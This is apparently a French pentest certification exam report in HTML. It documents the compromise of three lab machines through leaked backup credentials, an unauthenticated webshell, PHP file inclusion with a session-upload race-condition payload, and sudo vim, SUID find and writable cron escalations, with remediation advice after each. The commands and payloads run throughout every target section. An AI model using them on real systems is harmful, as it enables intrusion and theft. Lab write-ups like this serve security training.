@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>ThunderCipher TC-VAPT — Rapport de Certification</title>
+<style>
+  @page {
+    size: A4;
+    margin: 2.2cm 1.8cm 2.4cm 1.8cm;
+    @bottom-center {
+      content: "ThunderCipher TC-VAPT — Rapport confidentiel — Page " counter(page) " / " counter(pages);
+      font-size: 8pt;
+      color: #64748b;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    font-family: 'DejaVu Sans', Arial, sans-serif;
+    color: #0f172a;
+    font-size: 10.5pt;
+    line-height: 1.5;
+  }
+  h1, h2, h3, h4 { font-family: 'DejaVu Sans', Arial, sans-serif; color: #0f172a; page-break-after: avoid; }
+  .cover {
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    page-break-after: always;
+  }
+  .cover .badge {
+    background: #0f172a; color: #38bdf8; padding: 6px 18px; border-radius: 20px;
+    font-size: 10pt; letter-spacing: 1px; margin-bottom: 30px; font-weight: bold;
+  }
+  .cover h1 { font-size: 30pt; margin: 10px 0 4px 0; }
+  .cover h2 { font-size: 14pt; color: #475569; font-weight: normal; margin-top: 0; }
+  .cover-table {
+    margin-top: 50px; border-collapse: collapse; font-size: 11pt;
+  }
+  .cover-table td { padding: 7px 18px; border-bottom: 1px solid #e2e8f0; text-align: left; }
+  .cover-table td.label { color: #64748b; font-weight: bold; }
+  .cover .conf { margin-top: 60px; font-size: 9pt; color: #94a3b8; max-width: 420px; }
+
+  section { page-break-before: always; }
+  section:first-of-type { page-break-before: auto; }
+
+  h2.section-title {
+    font-size: 16pt; border-bottom: 3px solid #38bdf8; padding-bottom: 6px; margin-top: 0;
+  }
+  h3.sub { font-size: 13pt; color: #0284c7; margin-top: 24px; border-left: 4px solid #38bdf8; padding-left: 10px; }
+  h4.step { font-size: 11pt; color: #0f172a; margin: 14px 0 4px 0; }
+
+  table.summary { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 9.5pt; }
+  table.summary th { background: #0f172a; color: white; padding: 8px; text-align: left; }
+  table.summary td { padding: 7px 8px; border-bottom: 1px solid #e2e8f0; }
+  table.summary tr:nth-child(even) { background: #f8fafc; }
+  .flag { font-family: 'DejaVu Sans Mono', monospace; background: #ecfdf5; color: #047857; padding: 2px 6px; border-radius: 4px; font-size: 9pt; font-weight: bold; border: 1px solid #a7f3d0; }
+
+  pre.evid {
+    background: #0f172a; color: #e2e8f0; padding: 10px 12px; border-radius: 6px;
+    font-family: 'DejaVu Sans Mono', monospace; font-size: 8pt; line-height: 1.4;
+    white-space: pre-wrap; word-wrap: break-word; margin: 6px 0 14px 0;
+    border-left: 4px solid #38bdf8;
+  }
+  pre.evid .cmd { color: #4ade80; }
+  .note {
+    background: #fff7ed; border: 1px solid #fed7aa; border-left: 4px solid #f97316;
+    padding: 8px 12px; border-radius: 4px; font-size: 9pt; margin: 10px 0;
+  }
+  .cve-box {
+    background: #eff6ff; border: 1px solid #bfdbfe; border-left: 4px solid #2563eb;
+    padding: 10px 12px; border-radius: 4px; font-size: 9.5pt; margin: 10px 0;
+  }
+  .chain {
+    background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 6px; padding: 10px 14px; margin: 10px 0;
+    font-size: 9.5pt;
+  }
+  .chain ol { margin: 4px 0 4px 18px; padding: 0; }
+  .chain li { margin-bottom: 4px; }
+  img.evidence { width: 100%; max-width: 480px; border: 1px solid #cbd5e1; border-radius: 6px; margin: 10px 0; display: block; }
+  .img-caption { font-size: 8.5pt; color: #64748b; text-align: center; margin-top: -4px; margin-bottom: 14px; }
+  table.recon { width: 100%; border-collapse: collapse; font-size: 9.5pt; margin: 10px 0; }
+  table.recon th { background: #1e293b; color: white; padding: 6px 8px; text-align: left; }
+  table.recon td { padding: 6px 8px; border-bottom: 1px solid #e2e8f0; }
+  .remediation { background: #fef2f2; border: 1px solid #fecaca; border-left: 4px solid #ef4444; padding: 10px 14px; border-radius: 4px; font-size: 9.5pt; margin-top: 10px; }
+  .remediation h4 { color: #b91c1c; margin: 0 0 6px 0; }
+  .toc { line-height: 2; }
+  .toc a { text-decoration: none; color: #0f172a; }
+  .severity { display:inline-block; padding: 2px 8px; border-radius: 10px; font-size: 8.5pt; font-weight: bold; color: white; }
+  .sev-high { background:#dc2626; }
+  .sev-crit { background:#991b1b; }
+</style>
+</head>
+<body>
+
+<!-- ======================= COVER ======================= -->
+<div class="cover">
+  <div class="badge">OFFICIAL CERTIFICATION — PRACTICAL EXAM REPORT</div>
+  <h1>ThunderCipher Certified<br>VAPT Practitioner</h1>
+  <h2>(TC-VAPT) — Rapport de Pentest Pratique</h2>
+
+  <table class="cover-table">
+    <tr><td class="label">Candidat</td><td>Hodabalo Raphaël BOUE</td></tr>
+    <tr><td class="label">Compte plateforme</td><td>hodabalo</td></tr>
+    <tr><td class="label">Email</td><td>raphboue022@gmail.com</td></tr>
+    <tr><td class="label">Examen</td><td>ThunderCipher Certified VAPT Practitioner — Exam #1</td></tr>
+    <tr><td class="label">Date de réalisation</td><td>09 Novembre 2026</td></tr>
+    <tr><td class="label">Durée allouée</td><td>12 heures (lab) + 24 heures (soumission)</td></tr>
+    <tr><td class="label">Cibles évaluées</td><td>Vault · UploadX · Phantom (3 machines, environnement "container")</td></tr>
+    <tr><td class="label">Résultat</td><td><b>3/3 machines compromises — User + Root flags obtenus sur chaque cible</b></td></tr>
+  </table>
+
+  <p class="conf">
+    Document confidentiel — à usage exclusif de ThunderCipher dans le cadre de l'évaluation TC-VAPT.
+    Ne pas publier, partager ou distribuer ce rapport ou le contenu du lab, conformément au règlement de l'examen.
+  </p>
+</div>
+
+<!-- ======================= TABLE OF CONTENTS ======================= -->
+<section>
+<h2 class="section-title">Sommaire</h2>
+<div class="toc">
+  1. Introduction et portée de l'engagement<br>
+  2. Méthodologie (4 phases)<br>
+  3. Outils utilisés<br>
+  4. Résumé exécutif des résultats<br>
+  5. Cible 1 — Vault (192.168.5.249)<br>
+  6. Cible 2 — UploadX (192.168.5.119)<br>
+  7. Cible 3 — Phantom (192.168.5.237)<br>
+  8. Synthèse des vulnérabilités et recommandations<br>
+  9. Conclusion<br>
+</div>
+
+<h3 class="sub">1. Introduction et portée de l'engagement</h3>
+<p>
+Ce rapport documente l'évaluation pratique réalisée dans le cadre de la certification <b>ThunderCipher Certified
+VAPT Practitioner (TC-VAPT)</b>, examen #1, hébergé sur la plateforme <code>thundercipher.in</code>. L'environnement
+d'examen comprenait trois machines cibles indépendantes (« Vault », « UploadX », « Phantom »), accessibles
+uniquement via le VPN OpenVPN fourni par la plateforme (réseau interne <code>192.168.5.0/24</code>).
+</p>
+<p>
+Conformément au règlement de l'examen, l'objectif était, pour chaque machine : obtenir un accès initial,
+élever les privilèges jusqu'à <code>root</code>, et capturer les deux flags (user et root) au format
+<code>ThunderCipher{...}</code>. L'attaque a été strictement limitée au périmètre du lab (adresses
+<code>192.168.5.0/24</code> routées par le VPN de l'examen) ; aucun système hors de ce périmètre n'a été testé.
+</p>
+<p>
+Toutes les actions décrites ci-dessous ont été exécutées depuis un poste Kali Linux relié au lab par le
+tunnel OpenVPN officiel de la plateforme (interface <code>tun0</code>, adresse attribuée <code>10.8.0.57</code>).
+</p>
+
+<h3 class="sub">2. Méthodologie (4 phases)</h3>
+<table class="recon">
+<tr><th>Phase</th><th>Description</th></tr>
+<tr><td><b>1. Reconnaissance &amp; Information Gathering</b></td><td>Scan de ports (nmap), identification des services web (curl, en-têtes HTTP), énumération de contenu (ffuf, sondes ciblées sur fichiers/dossiers sensibles).</td></tr>
+<tr><td><b>2. Vulnerability Identification &amp; Analysis</b></td><td>Analyse manuelle du code/comportement de chaque application web pour identifier les faiblesses exploitables (directory listing, LFI, credentials en clair, permissions excessives).</td></tr>
+<tr><td><b>3. Exploitation &amp; Privilege Escalation</b></td><td>Exploitation contrôlée de chaque vulnérabilité pour obtenir un accès initial, puis élévation de privilèges jusqu'à <code>root</code> via des techniques GTFOBins, abus de cron root, ou race condition applicative.</td></tr>
+<tr><td><b>4. Post-Exploitation &amp; Reporting</b></td><td>Capture des flags, preuve d'impact (lecture <code>/root/root.txt</code>), nettoyage des artefacts déposés (scripts, binaires temporaires), documentation complète ci-dessous.</td></tr>
+</table>
+
+<h3 class="sub">3. Outils utilisés</h3>
+<table class="recon">
+<tr><th>Outil</th><th>Usage</th></tr>
+<tr><td>OpenVPN 2.7.8</td><td>Connexion au réseau interne du lab (<code>thundercipher-vpn.ovpn</code>)</td></tr>
+<tr><td>nmap 7.99</td><td>Découverte de ports/services sur les 3 cibles</td></tr>
+<tr><td>curl</td><td>Interaction HTTP brute (requêtes, en-têtes, authentification, exfiltration LFI)</td></tr>
+<tr><td>ffuf</td><td>Fuzzing de contenu web</td></tr>
+<tr><td>sshpass / OpenSSH client</td><td>Connexions SSH authentifiées par mot de passe</td></tr>
+<tr><td>Python 3 (requests, threading)</td><td>Script d'exploitation de la race condition PHP <code>session.upload_progress</code> (Phantom)</td></tr>
+<tr><td>GTFOBins (méthodologie)</td><td>Identification des techniques d'élévation via binaires SUID / sudo</td></tr>
+</table>
+
+</section>
+
+<!-- ======================= EXEC SUMMARY ======================= -->
+<section>
+<h2 class="section-title">4. Résumé exécutif des résultats</h2>
+<p>Les trois machines de l'examen ont été intégralement compromises : accès initial obtenu, privilèges élevés
+jusqu'à <code>root</code>, et les deux flags (user + root) capturés sur chacune. Aucune cible n'a résisté au-delà
+de la phase d'escalade de privilèges.</p>
+
+<table class="summary">
+<tr><th>Cible</th><th>IP</th><th>Points</th><th>Vulnérabilité initiale</th><th>Vecteur d'escalade root</th><th>Statut</th></tr>
+<tr>
+  <td><b>Vault</b></td><td>192.168.5.249</td><td>120</td>
+  <td>Directory listing → <code>config.php.bak</code> (credentials en clair)</td>
+  <td><code>sudo</code> NOPASSWD sur <code>/usr/bin/vim</code> (GTFOBins)</td>
+  <td>✅ Root + flags</td>
+</tr>
+<tr>
+  <td><b>UploadX</b></td><td>192.168.5.119</td><td>160</td>
+  <td>Directory listing → webshell préexistant non authentifié (RCE)</td>
+  <td>Binaire <code>/usr/bin/find</code> SUID root (GTFOBins)</td>
+  <td>✅ Root + flags</td>
+</tr>
+<tr>
+  <td><b>Phantom</b></td><td>192.168.5.237</td><td>180</td>
+  <td>Local File Inclusion (LFI) non authentifiée via <code>?page=</code></td>
+  <td>Cron root world-writable (<code>/opt/backup.sh</code>) détourné</td>
+  <td>✅ Root + flags</td>
+</tr>
+</table>
+
+<h4 class="step">Flags capturés</h4>
+<table class="summary">
+<tr><th>Cible</th><th>Flag User</th></tr>
+<tr><td>Vault</td><td class="flag">ThunderCipher{vault_user_9f3a7c2d8b1e_secureaccess}</td></tr>
+<tr><td>UploadX</td><td class="flag">ThunderCipher{uploadx_user_initial_access_7ac91e}</td></tr>
+<tr><td>Phantom</td><td class="flag">ThunderCipher{phantom_lfi_to_ssh_access_gained_7f3a9c2d8e1b}</td></tr>
+</table>
+<table class="summary">
+<tr><th>Cible</th><th>Flag Root</th></tr>
+<tr><td>Vault</td><td class="flag">ThunderCipher{vault_root_a81c92ff7e6d_fullcompromise}</td></tr>
+<tr><td>UploadX</td><td class="flag">ThunderCipher{uploadx_root_full_system_control_a91f2c}</td></tr>
+<tr><td>Phantom</td><td class="flag">ThunderCipher{phantom_full_chain_privilege_escalation_root_91ac7d2f8b6e}</td></tr>
+</table>
+
+<h4 class="step">Preuve — environnement d'examen démarré (plateforme ThunderCipher)</h4>
+<img class="evidence" src="img_exam_overview.jpg">
+<div class="img-caption">Fig. 1 — Page officielle de l'examen TC-VAPT, compte « hodabalo », inscription confirmée (Enrollment / Access / Credentials).</div>
+
+<img class="evidence" src="img_challenges.jpg">
+<div class="img-caption">Fig. 2 — Les 3 cibles de l'examen démarrées et prêtes (« Environment is running »), avec leurs descriptifs respectifs.</div>
+
+</section>
+
+<!-- ======================= VAULT ======================= -->
+<section>
+<h2 class="section-title">5. Cible 1 — Vault (192.168.5.249)</h2>
+<p><i>« L'organisation estime son coffre-fort interne sécurisé. Cependant, des audits récents suggèrent une
+possible exposition de données de configuration sensibles. »</i></p>
+
+<h3 class="sub">5.1 Reconnaissance</h3>
+<h4 class="step">Scan de ports</h4>
+<pre class="evid"><span class="cmd">$ sudo nmap -Pn -p1-1000 --open -T4 192.168.5.249</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</pre>
+
+<p>Le port 80 héberge une application PHP (Apache/2.4.63 Ubuntu) présentant un formulaire de connexion
+« Vault • Secure Access » (champs <code>username</code> / <code>password</code>, cookie <code>PHPSESSID</code>).</p>
+
+<h3 class="sub">5.2 Identification de la vulnérabilité</h3>
+<p>Des tentatives de bypass par injection SQL sur le formulaire de login se sont révélées infructueuses
+(requêtes probablement paramétrées). L'énumération ciblée de chemins sensibles a révélé un répertoire
+<code>/backup/</code> avec <b>listing de répertoire activé</b>, exposant un fichier de sauvegarde de code source :</p>
+
+<pre class="evid"><span class="cmd">$ curl -s http://192.168.5.249/backup/</span>
+Index of /backup
+...
+&lt;a href="config.php.bak"&gt;config.php.bak&lt;/a&gt;   2026-03-19 13:28   58
+
+<span class="cmd">$ curl -s http://192.168.5.249/backup/config.php.bak</span>
+&lt;?php
+$db_user = "admin";
+$db_pass = "SuperSecure123";
+?&gt;</pre>
+
+<div class="cve-box"><b>Vulnérabilité :</b> CWE-530 (Exposure of Backup File to an Unauthorized Control Sphere)
+combinée à CWE-548 (Exposure of Information Through Directory Listing). Un fichier de sauvegarde
+<code>.bak</code> contenant des identifiants en clair est accessible publiquement sans authentification.</div>
+
+<h3 class="sub">5.3 Exploitation — Accès initial</h3>
+<p>Les identifiants extraits (<code>admin</code> / <code>SuperSecure123</code>) sont réutilisés à la fois pour
+le portail web et pour le compte système <code>admin</code> via SSH (mauvaise pratique de réutilisation de mot
+de passe) :</p>
+
+<pre class="evid"><span class="cmd">$ curl -s -c cj.txt -X POST http://192.168.5.249/ \
+    --data-urlencode "username=admin" --data-urlencode "password=SuperSecure123"</span>
+HTTP/1.1 302 Found
+Location: /index.php   → Authentification web réussie
+
+<span class="cmd">$ ssh admin@192.168.5.249   (mot de passe: SuperSecure123)</span>
+uid=1000(admin) gid=1000(admin) groups=1000(admin),100(users)
+
+<span class="cmd">$ cat ~/user.txt</span>
+ThunderCipher{vault_user_9f3a7c2d8b1e_secureaccess}</pre>
+
+<h3 class="sub">5.4 Élévation de privilèges — Root</h3>
+<p>L'énumération <code>sudo -l</code> révèle une règle <code>NOPASSWD</code> sur l'éditeur <code>vim</code>,
+une technique d'évasion documentée sur GTFOBins (exécution d'une commande shell depuis l'éditeur avec les
+privilèges de sudo) :</p>
+
+<pre class="evid"><span class="cmd">$ sudo -l</span>
+User admin may run the following commands on hodabalo207:
+    (ALL) NOPASSWD: /usr/bin/vim
+
+<span class="cmd">$ sudo vim -c ':!cat /root/root.txt' -c ':q!' -c ':q!'</span>
+ThunderCipher{vault_root_a81c92ff7e6d_fullcompromise}</pre>
+
+<div class="chain">
+<b>Chaîne d'exploitation résumée — Vault :</b>
+<ol>
+<li>Découverte de <code>/backup/</code> ouvert au listing (énumération de contenu).</li>
+<li>Lecture de <code>config.php.bak</code> → identifiants <code>admin:SuperSecure123</code>.</li>
+<li>Authentification réussie sur le portail web <b>et</b> en SSH (réutilisation de mot de passe).</li>
+<li>Capture du flag utilisateur.</li>
+<li><code>sudo -l</code> → NOPASSWD sur <code>vim</code> → évasion GTFOBins vers un shell root.</li>
+<li>Capture du flag root.</li>
+</ol>
+</div>
+
+<div class="remediation">
+<h4>Recommandations de remédiation</h4>
+• Désactiver le listing de répertoire Apache (<code>Options -Indexes</code>) et retirer tout fichier de
+sauvegarde (<code>.bak</code>, <code>~</code>, <code>.old</code>) du webroot en production.<br>
+• Ne jamais stocker d'identifiants en clair dans le code source ; utiliser un gestionnaire de secrets /
+variables d'environnement.<br>
+• Interdire la réutilisation d'un même mot de passe entre l'application web et les comptes système.<br>
+• Retirer la règle <code>sudo NOPASSWD: /usr/bin/vim</code> ou la restreindre à des commandes précises sans
+échappement shell (voir GTFOBins pour la liste des binaires dangereux en sudo).
+</div>
+</section>
+
+<!-- ======================= UPLOADX ======================= -->
+<section>
+<h2 class="section-title">6. Cible 2 — UploadX (192.168.5.119)</h2>
+<p><i>« UploadX est une plateforme de partage de fichiers utilisée par les employés. Des préoccupations de
+sécurité ont été soulevées concernant des mécanismes de validation d'entrée incorrects. »</i></p>
+
+<h3 class="sub">6.1 Reconnaissance</h3>
+<pre class="evid"><span class="cmd">$ sudo nmap -Pn -p1-1000 --open -T4 192.168.5.119</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</pre>
+
+<p>La page d'accueil est une landing page statique contenant un commentaire HTML révélateur :
+<code>&lt;!-- TODO: Remove dev upload endpoint before production --&gt;</code>.</p>
+
+<h3 class="sub">6.2 Identification de la vulnérabilité</h3>
+<p>Une sonde ciblée sur les chemins liés à l'upload révèle <code>/upload.php</code> et surtout un dossier
+<code>/uploads/</code> avec <b>listing de répertoire activé</b>, exposant deux fichiers PHP déjà déposés
+(résidus d'un accès antérieur / webshell pré-existant) :</p>
+
+<pre class="evid"><span class="cmd">$ curl -s http://192.168.5.119/uploads/</span>
+Index of /uploads
+&lt;a href="credential.php"&gt;credential.php&lt;/a&gt;   259
+&lt;a href="file.php"&gt;file.php&lt;/a&gt;                31</pre>
+
+<p><code>file.php</code> s'est révélé être un webshell minimal acceptant une commande via le paramètre GET
+<code>cmd</code>, exécutable sans authentification :</p>
+
+<pre class="evid"><span class="cmd">$ curl -s "http://192.168.5.119/uploads/file.php?cmd=id"</span>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+
+<div class="cve-box"><b>Vulnérabilité :</b> CWE-306 (Missing Authentication for Critical Function) — Remote
+Code Execution non authentifiée (webshell accessible publiquement) + CWE-548 (directory listing) ayant permis
+de le découvrir.</div>
+
+<h3 class="sub">6.3 Exploitation — Accès initial</h3>
+<p>Via le RCE, lecture du second fichier exposé (<code>credential.php</code>), qui contient un commentaire
+développeur avec des identifiants de sauvegarde :</p>
+
+<pre class="evid"><span class="cmd">$ curl -s -G "http://192.168.5.119/uploads/file.php" \
+    --data-urlencode "cmd=cat /var/www/html/uploads/credential.php"</span>
+// Backup credentials for testing:
+// Username: uploadx
+// Password: UploadX@123
+// NOTE: Remove before production deployment.
+
+<span class="cmd">$ ssh uploadx@192.168.5.119   (mot de passe: UploadX@123)</span>
+uid=1000(uploadx) gid=1000(uploadx) groups=1000(uploadx),100(users)
+
+<span class="cmd">$ cat ~/user.txt</span>
+ThunderCipher{uploadx_user_initial_access_7ac91e}</pre>
+
+<h3 class="sub">6.4 Élévation de privilèges — Root</h3>
+<p><code>sudo -l</code> ne révèle aucun droit exploitable, mais l'énumération des binaires SUID montre que
+<code>/usr/bin/find</code> porte le bit SUID root — un vecteur GTFOBins classique :</p>
+
+<pre class="evid"><span class="cmd">$ find / -perm -4000 -type f 2>/dev/null</span>
+...
+/usr/bin/find        ← SUID root (-rwsr-x--- root uploadx)
+...
+
+<span class="cmd">$ find /usr/bin/find -exec cat /root/root.txt \;</span>
+ThunderCipher{uploadx_root_full_system_control_a91f2c}</pre>
+
+<div class="chain">
+<b>Chaîne d'exploitation résumée — UploadX :</b>
+<ol>
+<li><code>/uploads/</code> ouvert au listing → découverte d'un webshell (<code>file.php?cmd=</code>) et d'un
+fichier de notes développeur (<code>credential.php</code>).</li>
+<li>RCE non authentifiée confirmée (<code>id</code> → www-data).</li>
+<li>Lecture du code source de <code>credential.php</code> via le webshell → identifiants <code>uploadx:UploadX@123</code>.</li>
+<li>Connexion SSH, capture du flag utilisateur.</li>
+<li><code>find</code> SUID root → évasion GTFOBins vers un shell root.</li>
+<li>Capture du flag root.</li>
+</ol>
+</div>
+
+<div class="remediation">
+<h4>Recommandations de remédiation</h4>
+• Supprimer tout fichier résiduel / webshell du dossier <code>uploads/</code> et interdire l'exécution de PHP
+dans les dossiers d'upload (<code>php_admin_flag engine off</code> ou équivalent Apache/Nginx).<br>
+• Désactiver le listing de répertoire.<br>
+• Ne jamais laisser de commentaires contenant des identifiants dans le code livré en production.<br>
+• Retirer le bit SUID sur <code>/usr/bin/find</code> (il n'a aucune raison légitime de l'avoir) ; auditer
+régulièrement les binaires SUID du système avec <code>find / -perm -4000</code>.
+</div>
+</section>
+
+<!-- ======================= PHANTOM ======================= -->
+<section>
+<h2 class="section-title">7. Cible 3 — Phantom (192.168.5.237)</h2>
+<p><i>« Une activité suspecte a été détectée sur le serveur Phantom. Enquêter pour déterminer si un attaquant
+a établi une persistance dans le système. »</i></p>
+
+<h3 class="sub">7.1 Reconnaissance</h3>
+<pre class="evid"><span class="cmd">$ sudo nmap -Pn -p1-1000 --open -T4 192.168.5.237</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</pre>
+
+<p>L'application est un portail interne « Phantom Internal Portal » pilotant son contenu via un paramètre
+d'URL <code>?page=</code>, avec un avertissement explicite dans l'interface : <i>« Legacy file loader is still
+active in this build. »</i></p>
+
+<h3 class="sub">7.2 Identification de la vulnérabilité — Local File Inclusion</h3>
+<p>Le paramètre <code>page</code> est directement passé à <code>include()</code> côté PHP, sans aucune
+validation ni restriction d'extension :</p>
+
+<pre class="evid"><span class="cmd">$ curl -s "http://192.168.5.237/?page=../../../../../../etc/passwd"</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+
+<span class="cmd"># Confirmation du code source via le wrapper php://filter :</span>
+$ curl -s "http://192.168.5.237/?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php"
+   → décodé : $page = $_GET['page'] ?? 'home.php'; include($page);</pre>
+
+<div class="cve-box"><b>Vulnérabilité :</b> CWE-98 (PHP Local File Inclusion) — <code>include($_GET['page'])</code>
+sans sanitization ni liste blanche.</div>
+
+<h3 class="sub">7.3 Exploitation — De la LFI au RCE (race condition)</h3>
+<p>L'exploitation directe en RCE via les wrappers <code>data://</code> ou <code>php://input</code> a échoué
+(<code>allow_url_include = Off</code> confirmé par lecture du <code>php.ini</code> via LFI). Les journaux Apache
+(<code>/var/log/apache2/*.log</code>) classiquement utilisés pour le « log poisoning » se sont révélés
+illisibles par <code>www-data</code> (non membre du groupe <code>adm</code>).</p>
+
+<p>L'exécution de code a finalement été obtenue via la technique de <b>race condition sur
+<code>session.upload_progress</code> de PHP</b> : un upload multipart lent contenant le payload PHP dans le
+champ spécial <code>PHP_SESSION_UPLOAD_PROGRESS</code> crée un fichier de session temporaire sur disque
+(<code>/var/lib/php/sessions/sess_&lt;id&gt;</code>), lisible par le même utilisateur <code>www-data</code> ;
+une requête LFI parallèle inclut ce fichier pendant la fenêtre où l'upload est encore en cours :</p>
+
+<pre class="evid"><span class="cmd">$ python3 race_lfi.py "id"</span>
+[Thread 1] POST multipart lent, Cookie: PHPSESSID=evilsess,
+           champ PHP_SESSION_UPLOAD_PROGRESS = &lt;?php system($_GET["c"]); ?&gt;
+[Thread 2] GET /?page=/var/lib/php/sessions/sess_evilsess&c=id   (répété en boucle)
+
+=== GOT OUTPUT ===
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+
+<p>Le flag utilisateur est directement lisible malgré les permissions restrictives du dossier
+<code>/home/phantom</code> (bit d'exécution sans lecture, traversable si le nom de fichier est connu) :</p>
+
+<pre class="evid"><span class="cmd">$ (via RCE) cat /home/phantom/user.txt</span>
+ThunderCipher{phantom_lfi_to_ssh_access_gained_7f3a9c2d8e1b}</pre>
+
+<h3 class="sub">7.4 Investigation de persistance &amp; Élévation de privilèges — Root</h3>
+<p>Conformément à l'énoncé du challenge (« déterminer si un attaquant a établi une persistance »),
+l'inspection de <code>/etc/crontab</code> révèle une tâche root exécutée chaque minute pointant vers un script
+aux permissions excessives :</p>
+
+<pre class="evid"><span class="cmd">$ (via RCE) cat /etc/crontab</span>
+* * * * * root /opt/backup.sh
+
+<span class="cmd">$ (via RCE) ls -la /opt/backup.sh</span>
+-rwxrwxrwx 1 root root 54 Mar 19 2026 /opt/backup.sh      ← monde-inscriptible !
+$ cat /opt/backup.sh
+#!/bin/bash
+tar -czf /tmp/backup.tar.gz /home/phantom</pre>
+
+<p>Un script exécuté par <code>root</code> toutes les minutes, modifiable par n'importe quel utilisateur
+(y compris <code>www-data</code>), constitue une escalade de privilèges triviale. Une première tentative via
+un binaire SUID déposé dans <code>/tmp</code> a échoué silencieusement (<code>/tmp</code> est monté
+<code>nosuid</code>) ; le script a été réécrit pour exfiltrer directement le flag root via <code>/opt</code>
+(hors de <code>/tmp</code>, donc non soumis à <code>nosuid</code>) :</p>
+
+<pre class="evid"><span class="cmd">$ (via RCE) cat &gt; /opt/backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+cat /root/root.txt &gt; /opt/out.txt 2&gt;&amp;1; chmod 666 /opt/out.txt
+EOF</span>
+<span class="cmd"># ... attente du prochain déclenchement cron (&lt; 60s) ...</span>
+<span class="cmd">$ (via LFI) curl -s "http://192.168.5.237/?page=/opt/out.txt"</span>
+ThunderCipher{phantom_full_chain_privilege_escalation_root_91ac7d2f8b6e}</pre>
+
+<p>Après capture de la preuve, le script <code>/opt/backup.sh</code> a été restauré à son contenu d'origine et
+les fichiers temporaires déposés (<code>/opt/out.txt</code>, <code>/tmp/rootbash</code>) ont été supprimés,
+conformément aux bonnes pratiques de nettoyage post-exploitation.</p>
+
+<div class="chain">
+<b>Chaîne d'exploitation résumée — Phantom :</b>
+<ol>
+<li>LFI non authentifiée découverte via le paramètre <code>page</code> (<code>include()</code> sans filtrage).</li>
+<li>Lecture de fichiers système (<code>/etc/passwd</code>) et du code source applicatif (<code>php://filter</code>) pour confirmer la faille et la configuration PHP.</li>
+<li><code>allow_url_include=Off</code> et logs Apache illisibles → wrappers classiques et log poisoning inopérants.</li>
+<li>RCE obtenue par race condition sur <code>session.upload_progress</code> → exécution de commandes en <code>www-data</code>.</li>
+<li>Capture du flag utilisateur (lecture directe, malgré permissions restrictives du home).</li>
+<li>Découverte d'un cron root toutes les minutes exécutant un script <b>monde-inscriptible</b> (<code>/opt/backup.sh</code>) — preuve d'une faiblesse de configuration exploitable comme vecteur de persistance.</li>
+<li>Détournement du script pour exfiltrer <code>/root/root.txt</code> (contournement du montage <code>nosuid</code> de <code>/tmp</code> en écrivant hors de ce point de montage).</li>
+<li>Capture du flag root ; nettoyage des artefacts déposés.</li>
+</ol>
+</div>
+
+<div class="remediation">
+<h4>Recommandations de remédiation</h4>
+• Ne jamais passer une entrée utilisateur non filtrée à <code>include()</code>/<code>require()</code> ; utiliser
+une liste blanche stricte de pages autorisées.<br>
+• Désactiver <code>allow_url_fopen</code> si non nécessaire, et garder <code>allow_url_include=Off</code> (bonne
+pratique déjà en place ici, mais insuffisante seule).<br>
+• Restreindre les permissions de tout script exécuté par <code>cron</code> en tant que <code>root</code>
+(propriétaire root, <code>chmod 700</code>, dossier parent non inscriptible par d'autres utilisateurs).<br>
+• Auditer périodiquement <code>/etc/crontab</code> et <code>/etc/cron.d/</code> pour détecter les tâches
+root pointant vers des fichiers aux permissions excessives (vecteur de persistance classique pour un
+attaquant).<br>
+• Envisager <code>session.upload_progress.enabled=Off</code> si la fonctionnalité n'est pas utilisée par
+l'application.
+</div>
+</section>
+
+<!-- ======================= SYNTHESIS ======================= -->
+<section>
+<h2 class="section-title">8. Synthèse des vulnérabilités et recommandations générales</h2>
+
+<table class="summary">
+<tr><th>#</th><th>Cible</th><th>Vulnérabilité</th><th>Sévérité</th><th>CWE</th></tr>
+<tr><td>1</td><td>Vault</td><td>Exposition de fichier de sauvegarde avec identifiants en clair</td><td><span class="severity sev-high">HIGH</span></td><td>CWE-530 / CWE-548</td></tr>
+<tr><td>2</td><td>Vault</td><td>Règle sudo NOPASSWD sur binaire dangereux (vim)</td><td><span class="severity sev-crit">CRITICAL</span></td><td>CWE-250</td></tr>
+<tr><td>3</td><td>UploadX</td><td>Webshell non authentifié accessible publiquement</td><td><span class="severity sev-crit">CRITICAL</span></td><td>CWE-306 / CWE-94</td></tr>
+<tr><td>4</td><td>UploadX</td><td>Binaire SUID root non nécessaire (find)</td><td><span class="severity sev-crit">CRITICAL</span></td><td>CWE-250</td></tr>
+<tr><td>5</td><td>Phantom</td><td>Local File Inclusion non authentifiée</td><td><span class="severity sev-crit">CRITICAL</span></td><td>CWE-98</td></tr>
+<tr><td>6</td><td>Phantom</td><td>Script cron root monde-inscriptible</td><td><span class="severity sev-crit">CRITICAL</span></td><td>CWE-732</td></tr>
+</table>
+
+<p>Les trois environnements partagent un schéma commun : une faiblesse de configuration web relativement
+mineure en apparence (listing de répertoire, paramètre non filtré) sert de point d'entrée, et l'escalade de
+privilèges repose systématiquement sur une <b>erreur de configuration système locale</b> (sudoers trop permissif,
+SUID superflu, script root inscriptible par tous) plutôt que sur une faille du noyau ou un exploit complexe.
+Ce constat souligne l'importance d'un durcissement systématique post-déploiement (CIS Benchmarks, audits
+réguliers des permissions sudo/SUID/cron), indépendamment de la robustesse de la couche applicative.</p>
+
+</section>
+
+<!-- ======================= CONCLUSION ======================= -->
+<section>
+<h2 class="section-title">9. Conclusion</h2>
+<p>
+L'ensemble des objectifs de l'examen ThunderCipher Certified VAPT Practitioner (TC-VAPT) #1 a été atteint :
+les trois machines mises à disposition (Vault, UploadX, Phantom) ont été compromises de bout en bout, avec
+obtention de l'accès initial, élévation de privilèges jusqu'à <code>root</code>, et capture des six flags
+(trois utilisateur, trois root) requis par le règlement.
+</p>
+<p>
